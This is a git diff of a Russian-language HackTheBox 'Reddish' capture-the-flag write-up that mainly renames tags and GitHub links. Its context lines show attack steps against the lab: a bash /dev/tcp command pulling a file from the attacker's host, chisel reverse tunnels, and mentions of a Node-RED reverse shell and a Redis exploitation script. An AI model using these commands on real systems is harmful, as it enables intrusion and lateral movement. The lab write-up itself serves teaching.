@@ -3,7 +3,7 @@ layout: post
 title: "HTB{ Reddish }"
 date: 2020-03-17 18:00:00 +0300
 author: snovvcrash
-tags: [xakepru, write-up, hackthebox, machine, linux, node-red, lse.sh, networking, host-discovery, ping-sweep, static-nmap, pivoting, ssh-reverse-tcp, dropbear, tunneling, port-forwarding, chisel, upx, file-transfer, redis, rsync, docker, docker-compose]
+tags: [xakep-ru, hackmag-com, write-up, hackthebox, machine, linux, node-red, lse-sh, networking, host-discovery, ping-sweep, static-nmap, pivoting, ssh-reverse-tcp, dropbear, tunneling, port-forwarding, chisel, upx, file-transfer, redis, rsync, docker, docker-compose]
 ---
 
 [//]: # (2020-02-17)
@@ -28,7 +28,7 @@ tags: [xakepru, write-up, hackthebox, machine, linux, node-red, lse.sh, networki
 * TOC
 {:toc}
 
-[*Приложения*](https://github.com/snovvcrash/xakepru/tree/master/htb-reddish)
+[*Приложения*](https://github.com/snovvcrash/xakep-ru/tree/master/htb-reddish)
 
 # Разведка
 
@@ -72,7 +72,7 @@ PORT     STATE SERVICE VERSION
 
 На этом этапе есть два пути разобраться, что за приложение висит на этом порту:
 
-1. Сохранить [значок веб-сайта](https://raw.githubusercontent.com/snovvcrash/xakepru/master/htb-reddish/favicon.ico) к себе на машину (обычно они живут по адресу `/favicon.ico`) и попытаться найти, на что он похож, с помощью [Reverse Image Search](https://tineye.com/).
+1. Сохранить [значок веб-сайта](https://raw.githubusercontent.com/snovvcrash/xakep-ru/master/htb-reddish/favicon.ico) к себе на машину (обычно они живут по адресу `/favicon.ico`) и попытаться найти, на что он похож, с помощью [Reverse Image Search](https://tineye.com/).
 2. Спросить у поисковика, с чем чаще всего бывает ассоциирован порт `1880`.
 
 Второй вариант более «казуальный», однако не менее эффективный: уже на первой ссылке [по такому запросу](https://lmgtfy.com/?q=tcp+port+1880) мне открылась Истина.
@@ -159,7 +159,7 @@ Connection: keep-alive
 * Оранжевый: функция выполнения команд на сервере. Результат работы данного блока поступает на вход второму серому блоку. Обрати внимание: у оранжевого блока есть три выходных «клеммы». Они соответствуют `stdout`, `stderr` и коду возврата (который я не стал использовать).
 * Серый (справа): отправка выходных данных. Если открыть расширенные настройки блока (двойным кликом), можно задать особенности его поведения. Я выбрал Reply to TCP, чтобы Node-RED отправлял мне ответы в этом же подключении.
 
-О двух серых блоках можно думать, как о сетевых пайпах, по которым идет INPUT и OUTPUT блока exec. Я оставлю экспортированный поток в JSON у себя [на GitHub](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/simple-shell.json), чтобы не засорять тело статьи.
+О двух серых блоках можно думать, как о сетевых пайпах, по которым идет INPUT и OUTPUT блока exec. Я оставлю экспортированный поток в JSON у себя [на GitHub](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/node-red/simple-shell.json), чтобы не засорять тело статьи.
 
 Далее поднимем локального слушателя на Kali и устроим деплой!
 
@@ -183,7 +183,7 @@ Connection: keep-alive
 ![web-node-red-beautiful-shell-debug.png](/assets/images/htb/machines/reddish/web-node-red-beautiful-shell-debug.png)
 {:.center-image}
 
-Исходник в JSON-ке [здесь](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/beautiful-shell.json).
+Исходник в JSON-ке [здесь](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/node-red/beautiful-shell.json).
 
 ### file-upload
 
@@ -192,7 +192,7 @@ Connection: keep-alive
 ![web-node-red-file-upload.png](/assets/images/htb/machines/reddish/web-node-red-file-upload.png)
 {:.center-image}
 
-Здесь все совсем просто: по нажатию на кнопку Connect сервер подключается к порту `8889` моей машины (где уже поднят листенер с нужным файлом) и сохраняет полученную информацию у себя в скрытый файл `/tmp/.file` ([JSON](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/file-upload.json)).
+Здесь все совсем просто: по нажатию на кнопку Connect сервер подключается к порту `8889` моей машины (где уже поднят листенер с нужным файлом) и сохраняет полученную информацию у себя в скрытый файл `/tmp/.file` ([JSON](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/node-red/file-upload.json)).
 
 Испытаем этот поток в деле: я запускаю `nc` на Kali с указанием передать скрипт для проведения локальной разведки на Linux [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) (который я начал использовать вместо привычного [LinEnum.sh](https://github.com/rebootuser/LinEnum)), дожидаюсь окончания загрузки и проверяю контрольные суммы обоих копий.
 
@@ -231,7 +231,7 @@ root@nodered:~# bash -c 'cat < /dev/tcp/10.10.14.19/8889 > /tmp/.file'
 ![nodered-reverse-shell.png](/assets/images/htb/machines/reddish/nodered-reverse-shell.png)
 {:.center-image}
 
-Сперва я сделал это, как показано выше — путем открытия еще одного порта в новой вкладки терминала и вызовом [реверс-шелла](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) на Bash по TCP. Однако позже я решил упростить себе жизнь на случай, если придется перезапускать сессию, и собрал такой флоу в Node-RED ([JSON](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/reverse-shell.json)).
+Сперва я сделал это, как показано выше — путем открытия еще одного порта в новой вкладки терминала и вызовом [реверс-шелла](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) на Bash по TCP. Однако позже я решил упростить себе жизнь на случай, если придется перезапускать сессию, и собрал такой флоу в Node-RED ([JSON](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/node-red/reverse-shell.json)).
 
 ![web-node-red-reverse-shell.png](/assets/images/htb/machines/reddish/web-node-red-reverse-shell.png)
 {:.center-image}
@@ -243,7 +243,7 @@ node-red> ls -la /bin/sh
 lrwxrwxrwx 1 root root 4 Nov  8  2014 /bin/sh -> dash
 ```
 
-Теперь я могу написать простой [Bash-скрипт](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/ping-sweep.sh), чтобы триггерить callback в один клик из командной строки.
+Теперь я могу написать простой [Bash-скрипт](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/ping-sweep.sh), чтобы триггерить callback в один клик из командной строки.
 
 ```bash
 #!/usr/bin/env bash
@@ -346,7 +346,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds
 
 ## Сканирование неизвестных хостов
 
-Для того, чтобы выяснить, какие порты открыты на двух неизвестных хостах, можно снова написать такой [однострочник](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/port-scan.sh) на Bash.
+Для того, чтобы выяснить, какие порты открыты на двух неизвестных хостах, можно снова написать такой [однострочник](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/port-scan.sh) на Bash.
 
 ```bash
 #!/usr/bin/env bash
@@ -532,7 +532,7 @@ root@nodered:/tmp# ./chisel client 10.10.14.19:8000 R:127.0.0.1:8890:172.19.0.3:
 
 Если открыть `localhost:8890` в браузере, нас снова встретит радостная новость о том, что «It works!». Это мы уже видели, поэтому откроем сорцы веб-странички в поисках интересного кода.
 
-Целиком [исходник](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/www-index.html) вставлять не буду, только скриншот с интересными моментами.
+Целиком [исходник](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/www-index.html) вставлять не буду, только скриншот с интересными моментами.
 
 ![www-web-index-source.png](/assets/images/htb/machines/reddish/www-web-index-source.png)
 {:.center-image}
@@ -640,7 +640,7 @@ root@nodered:/tmp# ./chisel client 10.10.14.19:8000 7001:127.0.0.1:9001 &
 Сетевая карта. Часть 4: Первый туннель до Kali с nodered
 {:.quote}
 
-Я добавил две дополнительные строки в скрипт [pwn-redis.sh](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/pwn-redis.sh): «отправить шелл» и «запустить слушателя на порт `9001`».
+Я добавил две дополнительные строки в скрипт [pwn-redis.sh](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/pwn-redis.sh): «отправить шелл» и «запустить слушателя на порт `9001`».
 
 ```bash
 ...
@@ -914,14 +914,14 @@ cat root/root.txt
 
 ## Конфигурация docker
 
-У нас есть полноправный доступ к системе, поэтому из любопытства можно открыть конфигурацию docker [/opt/reddish_composition/docker-compose.yml](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml).
+У нас есть полноправный доступ к системе, поэтому из любопытства можно открыть конфигурацию docker [/opt/reddish_composition/docker-compose.yml](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/docker-compose.yml).
 
 Из нее мы видим:
 
-* список портов, доступных «снаружи» ([строка 7](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L7));
-* разделяемую с контейнерами `www` и `redis` внутреннюю сеть ([строка 10](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L10));
+* список портов, доступных «снаружи» ([строка 7](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/docker-compose.yml#L7));
+* разделяемую с контейнерами `www` и `redis` внутреннюю сеть ([строка 10](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/docker-compose.yml#L10));
 * конфигурации всех контейнеров (`nodered`, `www`, `redis`, `backup`);
-* флаг `--privileged`, с которым запущен контейнер `backup` ([строка 38](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/docker-compose.yml#L38)).
+* флаг `--privileged`, с которым запущен контейнер `backup` ([строка 38](https://github.com/snovvcrash/xakep-ru/blob/master/htb-reddish/docker-compose.yml#L38)).
 
 В соответствии с найденным конфигом я в последний раз обновлю свою сетевую карту.
 
